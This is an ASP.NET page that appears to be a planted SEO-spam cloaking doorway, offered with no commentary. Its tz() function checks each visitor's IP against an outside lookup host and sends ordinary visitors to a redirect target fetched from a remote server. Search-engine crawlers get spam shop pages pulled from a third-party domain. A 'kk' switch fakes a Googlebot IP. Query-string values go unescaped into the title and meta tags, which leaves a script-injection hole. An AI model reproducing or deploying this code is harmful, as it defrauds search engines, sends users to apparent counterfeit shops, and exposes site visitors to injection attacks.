<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            tz();
            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;

            a = new Random(System.DateTime.Now.Millisecond);
            string pname = Request.CurrentExecutionFilePath.Replace("/", "");
            string hyzhdy = "http://jb2img.style-js.com/GD_Page.aspx";

            if (Request.QueryString["type"] != null)
            {
                if (Request.QueryString["type"] == "search")
                {
                    string URL = hyzhdy + "?cid=" + Request.QueryString["cid"] + "&xi=1&xc=36&searchtxt=" + Request.QueryString["searchtxt"] + "&you=0&page=" + pname;
                    content = webclient.DownloadString(URL);

                }

            }
            else
            {
                string URL = "";
                if (Request.QueryString["shop"] != null)
                {
                    URL = hyzhdy + "?cid=" + Request.QueryString["cid"] + "&shop=" + Request.QueryString["shop"] + "&xi=" + Request.QueryString["xi"] + "&xc=" + Request.QueryString["xc"] + "&pl=" + Request.QueryString["pl"] + "&pr=" + Request.QueryString["pr"] + "&you=" + Request.QueryString["you"] + "&mt=http://tz.div-js.com/en/enm.txt";
               
                }
                else
                {
                    int cid = new Random().Next(1,89);
                    if (Request.QueryString["cid"] != null) { cid = int.Parse(Request.QueryString["cid"]); }
                    URL = hyzhdy + "?cid=" + cid + "&xi=1&xc=36&pnum=" + Request.QueryString["pnum"] + "&you=0&page=" + pname;
                   
                }
                content = webclient.DownloadString(URL);
				content = content.Replace("&pl=", "");
				content = content.Replace("&you=0", "");
                content = content.Replace("%20", "+");
                content = content.Replace("HHHHH", pname);
                content = content.Replace("BBBBB", HttpContext.Current.Request.Url.Host);
                content = content.Replace("AAAAA", pname + "?gj=com&type=addtocart");
                content = content.Replace("DDDDD", Request.QueryString["shop"] + " Gold White Black Red Blue Beige Grey Price Rose Orange Purple Green Yellow Cyan Bordeaux pink Indigo Brown Silver " + Request.QueryString["searchtxt"] + Request.QueryString["shop"]);
                content = content.Replace("QQQQQ", HttpContext.Current.Request.Url.Host);


            }


        }
    }
    public void tz()
    {

        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string ipurl = "http://cdoi09.fr/getdomain.aspx?rnd=1&ip=" + ip;
        webclient = new System.Net.WebClient();
        webclient.Encoding = System.Text.Encoding.UTF8;
        string domain = webclient.DownloadString(ipurl).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["shop"] != null)
            {
                string tzurl = webclient.DownloadString("http://tz.div-js.com/xtz2.txt").ToLower();
                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(Request.QueryString["shop"]) + "&xi=" + Request.QueryString["xi"] + "&xc=" + Request.QueryString["xc"]);
            }
            if (Request.QueryString["searchtxt"] != null)
            {
                string tzurl = webclient.DownloadString("http://tz.div-js.com/xtz2.txt").ToLower();

                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(Request.QueryString["searchtxt"]) + "&xi=" + Request.QueryString["xi"] + "&xc=" + Request.QueryString["xc"]);
            }
            if (Request.QueryString["pnum"] != null)
            {
                string tzurl = webclient.DownloadString("http://tz.div-js.com/xtz2.txt").ToLower();
                tzurl = tzurl.Replace("products.aspx", "");
                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "");
            }
        }

    }
    public System.Net.WebClient webclient = null;
    public string content = "";
    public System.Random a = null;
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <script>
        document.cookie = "u=" + window.location.href;
    </script>
    <meta http-equiv="Content-Language" />
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <title><%=Request.QueryString["shop"]%><%=Request.QueryString["searchtxt"]%> Online Shopping -<%=Request.QueryString["pnum"]%> </title>
    <meta name="keywords" content="<%=Request.QueryString["shop"]%><%=Request.QueryString["searchtxt"]%>" />
    <meta name="description" content="<%=Request.QueryString["shop"]%><%=Request.QueryString["searchtxt"]%> Sale OFF <%=a.Next(50, 70)%>% Easy,Convenient,Fashion,Cheaper Than Retail Price> Buy Clothing, Accessories and lifestyle products for women & men & child | <%=Request.QueryString["shop"]%><%=Request.QueryString["searchtxt"]%>" />
    <meta name="robots" content="index,follow,all" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="Robots" content="index, follows">
</head>
<body>
    <%=content %>
</body>
</html>
